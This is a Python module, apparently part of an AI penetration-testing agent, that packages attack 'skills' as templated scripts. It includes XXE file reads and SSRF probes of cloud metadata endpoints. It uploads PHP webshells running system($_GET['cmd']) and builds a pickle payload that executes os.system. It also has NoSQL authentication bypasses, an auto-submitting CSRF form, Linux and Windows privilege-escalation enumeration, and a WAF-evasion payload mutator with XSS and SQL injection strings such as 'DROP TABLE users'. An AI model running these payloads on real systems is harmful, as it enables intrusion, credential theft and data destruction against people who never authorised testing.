# -*- coding: utf-8 -*-
"""
扩展 Skills 库

整合自优秀项目:
- CyberStrikeAI: 知识型 Skills (XXE, SSRF, 文件上传等)
- PentestGPT: 实战 Exploit (Flag检测, OpenSSH枚举)
- NeuroSploit: PoC生成器, WAF绕过, Payload变异
"""

import re
import time
import json
import logging
import urllib.request
import urllib.parse
from typing import Dict, List, Any, Optional

logger = logging.getLogger(__name__)

# ==================== Flag 检测模式 (来自 PentestGPT) ====================

FLAG_PATTERNS = [
    r"flag\{[^\}]+\}",           # flag{...}
    r"FLAG\{[^\}]+\}",           # FLAG{...}
    r"HTB\{[^\}]+\}",            # HackTheBox
    r"CTF\{[^\}]+\}",            # CTF{...}
    r"[A-Za-z0-9_]+\{[^\}]+\}",  # Generic CTF format
    r"\b[a-f0-9]{32}\b",         # 32-char hex (HTB user/root flags)
]


# ==================== WAF 检测签名 (来自 NeuroSploit) ====================

WAF_SIGNATURES = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-request-id", "cf-cache-status"],
        "body": ["cloudflare", "cf-browser-verification"],
        "bypass": {
            "xss": ["unicode_escape", "svg_payload", "comment_injection"],
            "sqli": ["inline_comment", "case_mixing", "whitespace_variant"]
        }
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
        "body": ["aws", "amazon"],
        "bypass": {
            "xss": ["double_encoding", "unicode_escape"],
            "sqli": ["inline_comment", "case_mixing"]
        }
    },
    "modsecurity": {
        "headers": [],
        "body": ["mod_security", "modsecurity", "not acceptable"],
        "bypass": {
            "xss": ["inline_comment", "case_mixing", "whitespace_variant"],
            "sqli": ["inline_comment", "case_mixing", "double_encoding"]
        }
    },
    "imperva": {
        "headers": ["x-iinfo", "x-cdn"],
        "body": ["incapsula", "imperva"],
        "bypass": {
            "xss": ["unicode_escape", "svg_payload"],
            "sqli": ["inline_comment", "case_mixing"]
        }
    },
    "akamai": {
        "headers": ["x-akamai-session-info", "x-akamai-transformed"],
        "bypass": {"xss": ["unicode_escape"], "sqli": ["case_mixing"]}
    },
    "f5_bigip": {
        "headers": ["x-waf-status", "bigip"],
        "bypass": {"xss": ["double_encoding"], "sqli": ["inline_comment"]}
    }
}


# ==================== Payload 变异器 (来自 NeuroSploit) ====================

class PayloadMutator:
    """Payload 变异器 - 生成绕过变体"""
    
    @staticmethod
    def case_variation(payload: str) -> str:
        """大小写混淆: <script> -> <ScRiPt>"""
        result = ""
        for i, c in enumerate(payload):
            if c.isalpha():
                result += c.upper() if i % 2 else c.lower()
            else:
                result += c
        return result
    
    @staticmethod
    def unicode_escape(payload: str) -> str:
        """Unicode 编码: < -> \\u003c"""
        return payload.replace("<", "\\u003c").replace(">", "\\u003e")
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """双重 URL 编码"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def inline_comment(payload: str) -> str:
        """SQL 内联注释: UNION -> UN/**/ION"""
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]
        result = payload.upper()
        for kw in keywords:
            if kw in result:
                result = result.replace(kw, f"{kw[0]}/**/{kw[1:]}")
        return result
    
    @staticmethod
    def whitespace_variant(payload: str) -> str:
        """空白变体: 空格 -> %09, %0a, %0b"""
        variants = ["%09", "%0a", "%0b", "%0c", "%0d", "%a0"]
        result = payload.replace(" ", variants[0])
        return result
    
    @staticmethod
    def svg_bypass(payload: str) -> str:
        """SVG 标签绕过"""
        if "<script" in payload.lower():
            # 替换为 SVG onload
            return f'<svg/onload={payload.split("<script")[1].split(">")[0]}>'
        return payload
    
    @staticmethod
    def null_byte_insert(payload: str) -> str:
        """空字节插入"""
        return payload.replace("<", "<\x00").replace(">", "\x00>")
    
    @staticmethod
    def generate_variants(payload: str, vuln_type: str = "xss") -> List[str]:
        """生成所有变体"""
        mutators = [
            PayloadMutator.case_variation,
            PayloadMutator.unicode_escape,
            PayloadMutator.double_url_encode,
            PayloadMutator.null_byte_insert,
        ]
        
        if vuln_type == "sqli":
            mutators.extend([
                PayloadMutator.inline_comment,
                PayloadMutator.whitespace_variant,
            ])
        elif vuln_type == "xss":
            mutators.append(PayloadMutator.svg_bypass)
        
        variants = [payload]
        for mutator in mutators:
            try:
                variant = mutator(payload)
                if variant != payload and variant not in variants:
                    variants.append(variant)
            except Exception as e:
                logger.debug(f"Error generating payload variant: {e}")
        
        return variants


# ==================== 扩展 Skills 定义 ====================

def get_extended_skills() -> List[Dict[str, Any]]:
    """获取扩展 Skills 定义"""
    from .core import Skill, SkillType, SkillCategory, SkillParameter
    
    skills = []
    
    # ==================== XXE 测试 (来自 CyberStrikeAI) ====================
    skills.append(Skill(
        id="xxe_testing",
        name="XXE外部实体注入测试",
        type=SkillType.POC,
        category=SkillCategory.XXE,
        description="检测XML外部实体注入漏洞，支持文件读取、SSRF、盲XXE",
        parameters=[
            SkillParameter("target", "string", True, description="目标URL"),
            SkillParameter("method", "string", False, "POST", "请求方法"),
            SkillParameter("file", "string", False, "/etc/passwd", "要读取的文件"),
        ],
        target_type="url",
        severity="high",
        tags=["xxe", "xml", "injection"],
        executor="python",
        code='''
import urllib.request

target = "{{target}}"
method = "{{method}}"
file_path = "{{file}}"

xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://""" + file_path + """">
]>
<root><data>&xxe;</data></root>"""

try:
    if method.upper() == "POST":
        req = urllib.request.Request(target, data=xxe_payload.encode(), method='POST')
        req.add_header('Content-Type', 'application/xml')
    else:
        req = urllib.request.Request(target)
    
    response = urllib.request.urlopen(req, timeout=10)
    content = response.read().decode('utf-8', errors='ignore')
    
    # 检测成功标志
    indicators = ["root:", "nobody:", "[extensions]", "[fonts]"]
    for ind in indicators:
        if ind in content:
            print(f"XXE_VULNERABLE: {ind} found in response")
            print(f"EVIDENCE: {content[:500]}")
            break
    else:
        print("NO_XXE: No evidence found")
except Exception as e:
    print(f"ERROR: {str(e)[:100]}")
'''
    ))
    
    # ==================== SSRF 测试 (来自 CyberStrikeAI) ====================
    skills.append(Skill(
        id="ssrf_testing",
        name="SSRF服务器端请求伪造测试",
        type=SkillType.POC,
        category=SkillCategory.SSRF,
        description="检测SSRF漏洞，支持云服务元数据、内网扫描",
        parameters=[
            SkillParameter("target", "string", True, description="目标URL"),
            SkillParameter("param", "string", False, "url", "SSRF参数名"),
            SkillParameter("test_type", "string", False, "cloud", "测试类型: cloud/internal"),
        ],
        target_type="url",
        severity="high",
        tags=["ssrf", "cloud", "internal"],
        executor="python",
        code='''
import urllib.request
import urllib.parse

target = "{{target}}"
param = "{{param}}"
test_type = "{{test_type}}"

# 云服务元数据端点
cloud_endpoints = {
    "aws": "http://169.254.169.254/latest/meta-data/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance",
    "aliyun": "http://100.100.100.200/latest/meta-data/",
}

# 内网敏感端口
internal_ports = [
    ("127.0.0.1", 22, "SSH"),
    ("127.0.0.1", 6379, "Redis"),
    ("127.0.0.1", 11211, "Memcached"),
    ("127.0.0.1", 27017, "MongoDB"),
]

results = []

if test_type == "cloud":
    for cloud, endpoint in cloud_endpoints.items():
        try:
            url = f"{target}?{param}={urllib.parse.quote(endpoint)}"
            req = urllib.request.Request(url)
            response = urllib.request.urlopen(req, timeout=10)
            content = response.read().decode('utf-8', errors='ignore')
            
            if len(content) > 50 and "ami-id" in content or "instance" in content:
                results.append(f"SSRF_CLOUD_FOUND: {cloud} metadata accessible")
                print(f"SSRF_CLOUD_FOUND: {cloud}")
                print(f"EVIDENCE: {content[:200]}")
        except Exception as e:
            pass

elif test_type == "internal":
    for host, port, service in internal_ports:
        try:
            url = f"{target}?{param}=http://{host}:{port}/"
            req = urllib.request.Request(url)
            response = urllib.request.urlopen(req, timeout=5)
            results.append(f"SSRF_INTERNAL_FOUND: {service} on {host}:{port}")
        except urllib.error.HTTPError as e:
            if e.code in [200, 403, 401]:
                results.append(f"SSRF_INTERNAL_FOUND: {service} on {host}:{port} (HTTP {e.code})")
        except Exception:
            pass

if results:
    print("\\n".join(results))
else:
    print("NO_SSRF: No SSRF evidence found")
'''
    ))
    
    # ==================== 文件上传测试 (来自 CyberStrikeAI) ====================
    skills.append(Skill(
        id="file_upload_testing",
        name="文件上传漏洞测试",
        type=SkillType.POC,
        category=SkillCategory.FILE_UPLOAD,
        description="检测文件上传漏洞，测试多种绕过技术",
        parameters=[
            SkillParameter("target", "string", True, description="上传接口URL"),
            SkillParameter("file_type", "string", False, "php", "测试文件类型"),
        ],
        target_type="url",
        severity="critical",
        tags=["upload", "webshell", "bypass"],
        executor="python",
        code='''
import urllib.request
import urllib.parse

target = "{{target}}"
file_type = "{{file_type}}"

# 绕过技术
bypass_techniques = [
    # 图片马
    ("image/gif", b"GIF89a<?php phpinfo(); ?>", "shell.gif"),
    # 双扩展名
    ("image/jpeg", b"<?php system($_GET['cmd']); ?>", "shell.php.jpg"),
    # 空字节
    ("image/png", b"<?php system($_GET['cmd']); ?>\\x00.png", "shell.php%00.png"),
    # .htaccess
    ("text/plain", b"AddType application/x-httpd-php .jpg", ".htaccess"),
    # Content-Type 绕过
    ("image/png", b"<?php system($_GET['cmd']); ?>", "shell.php"),
]

results = []

for content_type, content, filename in bypass_techniques:
    try:
        # 构建 multipart/form-data
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = f"--{boundary}\\r\\n"
        body += f'Content-Disposition: form-data; name="file"; filename="{filename}"\\r\\n'
        body += f"Content-Type: {content_type}\\r\\n\\r\\n"
        body = body.encode() + content + f"\\r\\n--{boundary}--\\r\\n".encode()
        
        req = urllib.request.Request(target, data=body, method='POST')
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        
        response = urllib.request.urlopen(req, timeout=10)
        resp_content = response.read().decode('utf-8', errors='ignore')
        
        # 检测上传成功
        if "success" in resp_content.lower() or "uploaded" in resp_content.lower() or response.status == 200:
            results.append(f"UPLOAD_BYPASS: {filename} with Content-Type {content_type}")
            print(f"UPLOAD_SUCCESS: {filename}")
    except urllib.error.HTTPError as e:
        if e.code == 200:
            results.append(f"UPLOAD_BYPASS: {filename}")
    except Exception as e:
        pass

if results:
    print("\\n".join(results))
else:
    print("NO_UPLOAD_BYPASS: All techniques blocked")
'''
    ))
    
    # ==================== SSTI 模板注入测试 (来自 NeuroSploit) ====================
    skills.append(Skill(
        id="ssti_testing",
        name="SSTI服务端模板注入测试",
        type=SkillType.POC,
        category=SkillCategory.GENERAL,
        description="检测服务端模板注入漏洞，支持Jinja2、Twig、Freemarker等",
        parameters=[
            SkillParameter("target", "string", True, description="目标URL"),
            SkillParameter("param", "string", False, "name", "注入参数"),
        ],
        target_type="url",
        severity="critical",
        tags=["ssti", "template", "injection"],
        executor="python",
        code='''
import urllib.request
import urllib.parse

target = "{{target}}"
param = "{{param}}"

# SSTI Payload - 通用检测
ssti_payloads = [
    # 数学运算 (Jinja2, Twig)
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),  # Jinja2
    ("{{7*'7'}}", "49"),        # Twig
    # 类探测
    ("{{''.__class__}}", "class"),
    ("{{config}}", "config"),
    # Twig 特定
    ("{{_self.env.display('id')}}", "id"),
    # Freemarker
    ("${7*7}", "49"),
    # Velocity
    ("#set($x=7*7)$x", "49"),
    # Smarty
    ("{7*7}", "49"),
]

results = []

for payload, indicator in ssti_payloads:
    try:
        url = f"{target}?{param}={urllib.parse.quote(payload)}"
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        if indicator in content:
            results.append(f"SSTI_FOUND: {payload} -> {indicator}")
            print(f"SSTI_VULNERABLE: {payload}")
            
            # 检测模板引擎类型
            if "7777777" in content:
                print("TEMPLATE_ENGINE: Jinja2 (Python)")
            elif "49" in content and "{{" in payload:
                print("TEMPLATE_ENGINE: Jinja2/Twig")
            elif "${" in payload and "49" in content:
                print("TEMPLATE_ENGINE: Freemarker")
    except Exception as e:
        pass

if results:
    print("\\n".join(results))
else:
    print("NO_SSTI: No template injection found")
'''
    ))
    
    # ==================== IDOR 测试 (来自 CyberStrikeAI) ====================
    skills.append(Skill(
        id="idor_testing",
        name="IDOR不安全直接对象引用测试",
        type=SkillType.POC,
        category=SkillCategory.AUTH_BYPASS,
        description="检测IDOR漏洞，通过修改ID参数尝试访问其他用户数据",
        parameters=[
            SkillParameter("target", "string", True, description="目标URL模板，用{id}作为占位符"),
            SkillParameter("start_id", "integer", False, 1, "起始ID"),
            SkillParameter("end_id", "integer", False, 10, "结束ID"),
        ],
        target_type="url",
        severity="high",
        tags=["idor", "access-control", "auth"],
        executor="python",
        code='''
import urllib.request

target_template = "{{target}}"
start_id = {{start_id}}
end_id = {{end_id}}

results = []
unique_responses = set()

for user_id in range(start_id, end_id + 1):
    url = target_template.replace("{id}", str(user_id))
    
    try:
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read()
        content_hash = hash(content)
        
        # 检测不同的响应
        if content_hash not in unique_responses:
            unique_responses.add(content_hash)
            results.append({
                "id": user_id,
                "status": response.status,
                "length": len(content),
                "accessible": True
            })
            print(f"IDOR_ACCESSIBLE: ID={user_id}, Length={len(content)}")
        else:
            # 相同响应，可能是模板或无权限
            pass
            
    except urllib.error.HTTPError as e:
        if e.code in [403, 401]:
            results.append({"id": user_id, "status": e.code, "accessible": False})
        elif e.code == 200:
            results.append({"id": user_id, "status": 200, "accessible": True})
    except Exception as e:
        pass

# 分析结果
accessible_count = len([r for r in results if r.get("accessible")])
if accessible_count > 1:
    print(f"\\nIDOR_VULNERABLE: {accessible_count} different IDs accessible")
    print("POTENTIAL_IMPACT: May access other users' data")
elif accessible_count == 0:
    print("\\nNO_IDOR: Access properly restricted")
'''
    ))
    
    # ==================== CSRF 测试 (来自 CyberStrikeAI) ====================
    skills.append(Skill(
        id="csrf_testing",
        name="CSRF跨站请求伪造测试",
        type=SkillType.POC,
        category=SkillCategory.CSRF,
        description="检测CSRF漏洞，检查是否缺少CSRF Token",
        parameters=[
            SkillParameter("target", "string", True, description="目标表单URL"),
            SkillParameter("method", "string", False, "POST", "请求方法"),
        ],
        target_type="url",
        severity="medium",
        tags=["csrf", "token", "form"],
        executor="python",
        code='''
import urllib.request
import re

target = "{{target}}"
method = "{{method}}"

try:
    req = urllib.request.Request(target)
    response = urllib.request.urlopen(req, timeout=10)
    content = response.read().decode('utf-8', errors='ignore')
    
    # 检测 CSRF Token
    csrf_patterns = [
        r'name=["\']csrf[_-]?token["\']',
        r'name=["\']_token["\']',
        r'name=["\']authenticity_token["\']',
        r'name=["\']__RequestVerificationToken["\']',
        r'<input[^>]+type=["\']hidden["\'][^>]+value=["\'][^"\']+["\']',
    ]
    
    csrf_found = False
    for pattern in csrf_patterns:
        if re.search(pattern, content, re.IGNORECASE):
            csrf_found = True
            print(f"CSRF_TOKEN_FOUND: {pattern[:30]}...")
            break
    
    # 检测表单
    forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', content, re.IGNORECASE)
    
    if not csrf_found and forms:
        print("\\nCSRF_VULNERABLE: No CSRF token found in forms")
        print("FORMS_FOUND:", len(forms))
        
        # 生成 PoC
        print("\\n=== CSRF PoC ===")
        poc_html = """<html>
<body>
<form action="""" + target + """" method="""" + method + """">
<input type="hidden" name="field" value="attacker_value" />
<input type="submit" value="Submit" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>"""
        print(poc_html)
    elif csrf_found:
        print("\\nCSRF_PROTECTED: CSRF token detected")
    else:
        print("\\nNO_FORMS: No forms found on page")
        
except Exception as e:
    print("ERROR:", str(e)[:100])
'''
    ))
    
    # ==================== 反序列化测试 (来自 CyberStrikeAI) ====================
    skills.append(Skill(
        id="deserialization_testing",
        name="反序列化漏洞测试",
        type=SkillType.POC,
        category=SkillCategory.GENERAL,
        description="检测反序列化漏洞，支持Java、PHP、Python",
        parameters=[
            SkillParameter("target", "string", True, description="目标URL"),
            SkillParameter("type", "string", False, "java", "反序列化类型: java/php/python"),
        ],
        target_type="url",
        severity="critical",
        tags=["deserialization", "rce", "pickle"],
        executor="python",
        code='''
import urllib.request
import base64

target = "{{target}}"
deser_type = "{{type}}"

payloads = {}

if deser_type == "java":
    # Java 反序列化 DNS 查询
    payloads["java_dns"] = base64.b64encode(b"\\xac\\xed\\x00\\x05ur\\x00\\x13[Ljava.lang.Object;").decode()
    
elif deser_type == "php":
    # PHP 反序列化
    payloads["php_test"] = 'O:4:"Test":1:{s:3:"cmd";s:2:"id";}'
    
elif deser_type == "python":
    # Python Pickle RCE
    import pickle
    import os
    
    class RCE:
        def __reduce__(self):
            return (os.system, ('id',))
    
    payloads["python_pickle"] = base64.b64encode(pickle.dumps(RCE())).decode()

results = []

for name, payload in payloads.items():
    try:
        # 尝试不同的注入点
        headers = [
            ("Cookie", f"session={payload}"),
            ("X-Serialized-Object", payload),
        ]
        
        for header_name, header_value in headers:
            req = urllib.request.Request(target)
            req.add_header(header_name, header_value)
            
            try:
                response = urllib.request.urlopen(req, timeout=10)
                content = response.read().decode('utf-8', errors='ignore')
                
                # 检测命令执行迹象
                if "uid=" in content or "root:" in content:
                    results.append(f"DESER_VULNERABLE: {name} via {header_name}")
                    print(f"RCE_VIA_DESERIALIZATION: {name}")
            except Exception:
                pass
                
    except Exception as e:
        pass

if results:
    print("\\n".join(results))
else:
    print("NO_DESER_VULN: No deserialization vulnerability found")
'''
    ))
    
    # ==================== Flag 检测 (来自 PentestGPT) ====================
    skills.append(Skill(
        id="flag_detector",
        name="CTF Flag自动检测",
        type=SkillType.SCANNER,
        category=SkillCategory.GENERAL,
        description="自动检测文本中的CTF flag，支持多种格式",
        parameters=[
            SkillParameter("text", "string", True, description="要检测的文本"),
        ],
        target_type="file",
        severity="info",
        tags=["ctf", "flag", "detection"],
        executor="python",
        code='''
import re

text = """{{text}}"""

FLAG_PATTERNS = [
    r"flag\\{[^\\}]+\\}",
    r"FLAG\\{[^\\}]+\\}",
    r"HTB\\{[^\\}]+\\}",
    r"CTF\\{[^\\}]+\\}",
    r"[A-Za-z0-9_]+\\{[^\\}]+\\}",
    r"\\b[a-f0-9]{32}\\b",
]

found_flags = []

for pattern in FLAG_PATTERNS:
    matches = re.finditer(pattern, text, re.IGNORECASE)
    for match in matches:
        flag = match.group(0)
        if flag not in found_flags:
            found_flags.append(flag)
            print(f"FLAG_FOUND: {flag}")

if found_flags:
    print(f"\\nTOTAL_FLAGS: {len(found_flags)}")
else:
    print("NO_FLAGS_FOUND")
'''
    ))
    
    # ==================== WAF 检测 (来自 NeuroSploit) ====================
    skills.append(Skill(
        id="waf_detect",
        name="WAF防火墙检测",
        type=SkillType.RECON,
        category=SkillCategory.GENERAL,
        description="检测目标是否存在WAF，识别WAF类型",
        parameters=[
            SkillParameter("target", "string", True, description="目标URL"),
        ],
        target_type="url",
        severity="info",
        tags=["waf", "firewall", "detection"],
        executor="python",
        code='''
import urllib.request
import urllib.parse

target = "{{target}}"

# WAF 指纹库
WAF_SIGNATURES = {
    "Cloudflare": {"headers": ["cf-ray", "cf-request-id"]},
    "AWS WAF": {"headers": ["x-amzn-requestid"]},
    "Akamai": {"headers": ["x-akamai-session-info"]},
    "Imperva/Incapsula": {"headers": ["x-iinfo"], "body": ["incapsula"]},
    "ModSecurity": {"body": ["mod_security", "not acceptable"]},
    "F5 BIG-IP": {"headers": ["x-waf-status"]},
    "Sucuri": {"headers": ["x-sucuri-id"]},
    "Barracuda": {"body": ["barracuda"]},
}

detected_wafs = []

# 1. 正常请求检查headers
try:
    req = urllib.request.Request(target)
    response = urllib.request.urlopen(req, timeout=10)
    headers = dict(response.headers)
    body = response.read().decode('utf-8', errors='ignore').lower()
    
    for waf_name, sigs in WAF_SIGNATURES.items():
        # 检查headers
        for h in sigs.get("headers", []):
            if h.lower() in [k.lower() for k in headers.keys()]:
                detected_wafs.append(waf_name)
                print(f"WAF_DETECTED: {waf_name} (via header: {h})")
                break
        
        # 检查body
        for b in sigs.get("body", []):
            if b.lower() in body:
                if waf_name not in detected_wafs:
                    detected_wafs.append(waf_name)
                    print(f"WAF_DETECTED: {waf_name} (via body)")
except Exception as e:
    pass

# 2. 恶意请求测试
malicious_payloads = [
    ("?id=1' OR '1'='1", "SQL injection test"),
    ("?q=<script>alert(1)</script>", "XSS test"),
]

for payload, desc in malicious_payloads:
    try:
        url = target + payload
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(req, timeout=10)
        
        # 如果返回403，可能有WAF
        if response.status == 403:
            print(f"WAF_BLOCKING: {desc} returned 403")
    except urllib.error.HTTPError as e:
        if e.code == 403:
            print(f"WAF_BLOCKING: {desc} blocked with 403")
        elif e.code == 406:
            print(f"WAF_BLOCKING: {desc} blocked with 406 (ModSecurity)")
    except Exception:
        pass

if detected_wafs:
    print(f"\\nDETECTED_WAFS: {', '.join(detected_wafs)}")
else:
    print("\\nNO_WAF_DETECTED: No WAF signatures found")
'''
    ))
    
    # ==================== 权限提升检测 - Linux (来自 NeuroSploit) ====================
    skills.append(Skill(
        id="privesc_linux",
        name="Linux权限提升检测",
        type=SkillType.POST,
        category=SkillCategory.RCE,
        description="检测Linux系统权限提升向量",
        parameters=[
            SkillParameter("target", "string", True, description="目标主机 (通过已建立的shell)"),
        ],
        target_type="host",
        severity="high",
        tags=["privesc", "linux", "suid"],
        executor="bash",
        command_template='''
echo "=== Linux Privilege Escalation Enumeration ==="

echo -e "\\n[1] Kernel Version:"
uname -a

echo -e "\\n[2] Current User:"
id
whoami

echo -e "\\n[3] SUID Binaries:"
find / -perm -4000 2>/dev/null | head -20

echo -e "\\n[4] Sudo Permissions:"
sudo -l 2>/dev/null || echo "sudo not available or no password"

echo -e "\\n[5] Capabilities:"
getcap -r / 2>/dev/null | head -10

echo -e "\\n[6] Writable Paths:"
find / -writable -type d 2>/dev/null | grep -E "(etc|bin|usr)" | head -10

echo -e "\\n[7] Cron Jobs:"
ls -la /etc/cron* 2>/dev/null
cat /etc/crontab 2>/dev/null

echo -e "\\n[8] Interesting Files:"
find / -name "*.sh" -o -name "password*" -o -name "*.key" 2>/dev/null | head -10

echo -e "\\n[9] Network Info:"
netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null

echo -e "\\n[10] Docker/LXC Check:"
ls -la /dockerentry 2>/dev/null
cat /proc/1/cgroup 2>/dev/null | head -5
'''
    ))
    
    # ==================== 权限提升检测 - Windows (来自 NeuroSploit) ====================
    skills.append(Skill(
        id="privesc_windows",
        name="Windows权限提升检测",
        type=SkillType.POST,
        category=SkillCategory.RCE,
        description="检测Windows系统权限提升向量",
        parameters=[
            SkillParameter("target", "string", True, description="目标主机"),
        ],
        target_type="host",
        severity="high",
        tags=["privesc", "windows", "uac"],
        executor="bash",
        command_template='''
echo "=== Windows Privilege Escalation Enumeration ==="

echo "[1] System Info:"
systeminfo 2>/dev/null || echo "systeminfo not available"

echo -e "\\n[2] Current User:"
whoami /all 2>/dev/null || whoami

echo -e "\\n[3] Privileges:"
whoami /priv 2>/dev/null

echo -e "\\n[4] AlwaysInstallElevated:"
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>/dev/null
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>/dev/null

echo -e "\\n[5] Unquoted Service Paths:"
wmic service get name,displayname,pathname,startmode 2>/dev/null | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """

echo -e "\\n[6] Services with Weak Permissions:"
accesschk.exe -uwcqv "Everyone" * 2>/dev/null
accesschk.exe -uwcqv "Users" * 2>/dev/null
accesschk.exe -uwcqv "Authenticated Users" * 2>/dev/null

echo -e "\\n[7] Running Processes:"
tasklist /svc 2>/dev/null

echo -e "\\n[8] Network Connections:"
netstat -ano 2>/dev/null

echo -e "\\n[9] Scheduled Tasks:"
schtasks /query /fo LIST /v 2>/dev/null | head -50

echo -e "\\n[10] Interesting Files:"
dir /s /b C:\\Users\\*password* 2>/dev/null
dir /s /b C:\\Users\\*.kdbx 2>/dev/null
'''
    ))
    
    # ==================== OpenSSH 用户枚举 (来自 PentestGPT) ====================
    skills.append(Skill(
        id="openssh_user_enum",
        name="OpenSSH用户名枚举 (CVE-2018-15473)",
        type=SkillType.POC,
        category=SkillCategory.GENERAL,
        description="利用CVE-2018-15473枚举OpenSSH用户名",
        parameters=[
            SkillParameter("target", "string", True, description="目标主机IP"),
            SkillParameter("port", "integer", False, 22, "SSH端口"),
            SkillParameter("username", "string", False, "root", "要测试的用户名"),
        ],
        target_type="host",
        severity="medium",
        cve_id="CVE-2018-15473",
        tags=["ssh", "enumeration", "cve"],
        executor="python",
        code='''
import socket
import struct
import sys

target = "{{target}}"
port = {{port}}
username = "{{username}}"

print(f"Testing SSH user enumeration on {target}:{port}")
print(f"Username to test: {username}")

try:
    # 建立 SSH 连接
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((target, port))
    
    # 接收 SSH Banner
    banner = sock.recv(1024)
    print(f"SSH Banner: {banner.decode().strip()}")
    
    # 发送 SSH 版本
    sock.send(b"SSH-2.0-OpenSSH_7.5\\r\\n")
    
    # 等待密钥交换
    # 简化版本：仅测试连接
    # 完整漏洞利用需要构造特定的 SSH 协议包
    
    print("\\n[INFO] Full exploitation requires paramiko library")
    print("[INFO] Install: pip install paramiko")
    print(f"\\n[RECOMMENDATION] Use: ssh-audit {target} or nmap --script ssh-auth-methods")
    
    sock.close()
    
except socket.timeout:
    print("ERROR: Connection timeout")
except socket.error as e:
    print(f"ERROR: {e}")
except Exception as e:
    print(f"ERROR: {e}")
'''
    ))
    
    # ==================== NoSQL 注入测试 (来自 NeuroSploit) ====================
    skills.append(Skill(
        id="nosql_injection",
        name="NoSQL注入测试",
        type=SkillType.POC,
        category=SkillCategory.SQL_INJECTION,
        description="检测NoSQL注入漏洞，支持MongoDB",
        parameters=[
            SkillParameter("target", "string", True, description="目标URL"),
            SkillParameter("param", "string", False, "username", "注入参数"),
        ],
        target_type="url",
        severity="high",
        tags=["nosql", "mongodb", "injection"],
        executor="python",
        code='''
import urllib.request
import urllib.parse
import json

target = "{{target}}"
param = "{{param}}"

# NoSQL 注入 Payload
payloads = [
    # 绕过认证
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    # 布尔注入
    {"username": "admin", "password": {"$ne": "wrongpassword"}},
    # 数组注入
    {"username": ["admin", "user"], "password": "password"},
]

results = []

for i, payload in enumerate(payloads):
    try:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(target, data=data, method='POST')
        req.add_header('Content-Type', 'application/json')
        
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        # 检测成功标志
        success_indicators = ["welcome", "success", "token", "session", "logged in"]
        
        for ind in success_indicators:
            if ind.lower() in content.lower():
                results.append(f"NOSQL_VULNERABLE: Payload {i+1} - {ind}")
                print(f"NOSQL_AUTH_BYPASS: Payload {i+1}")
                print(f"PAYLOAD: {payload}")
                break
    except Exception as e:
        pass

# GET 参数注入测试
get_payloads = [
    '?username[$ne]=&password[$ne]=',
    '?username[$gt]=&password[$gt]=',
    '?username[$regex]=.*&password[$regex]=.*',
]

for payload in get_payloads:
    try:
        url = target + payload
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        for ind in ["welcome", "success", "token"]:
            if ind.lower() in content.lower():
                print(f"NOSQL_GET_VULN: {payload}")
                break
    except Exception:
        pass

if results:
    print(f"\\nNOSQL_INJECTION_FOUND: {len(results)} payloads worked")
else:
    print("\\nNO_NOSQL_VULN: No NoSQL injection found")
'''
    ))
    
    return skills


# ==================== 扩展的 WAF 绕过 Payload 库 ====================

def get_waf_bypass_payloads(vuln_type: str, waf_type: str = None) -> List[str]:
    """获取针对特定 WAF 的绕过 Payload"""
    
    base_payloads = {
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
        ],
        "sqli": [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "1; DROP TABLE users--",
            "' AND 1=1--",
        ]
    }
    
    payloads = base_payloads.get(vuln_type, [])
    variants = []
    
    for payload in payloads:
        # 生成变体
        variants.extend(PayloadMutator.generate_variants(payload, vuln_type))
    
    # 如果知道 WAF 类型，添加特定绕过
    if waf_type and waf_type in WAF_SIGNATURES:
        bypass_techs = WAF_SIGNATURES[waf_type].get("bypass", {}).get(vuln_type, [])
        # 根据 bypass 技术生成 payload
        for tech in bypass_techs:
            for payload in payloads[:2]:
                if tech == "unicode_escape":
                    variants.append(PayloadMutator.unicode_escape(payload))
                elif tech == "inline_comment":
                    variants.append(PayloadMutator.inline_comment(payload))
                elif tech == "case_mixing":
                    variants.append(PayloadMutator.case_variation(payload))
    
    return list(set(variants))


# ==================== 导出 ====================

__all__ = [
    "get_extended_skills",
    "PayloadMutator",
    "WAF_SIGNATURES",
    "FLAG_PATTERNS",
    "get_waf_bypass_payloads",
]
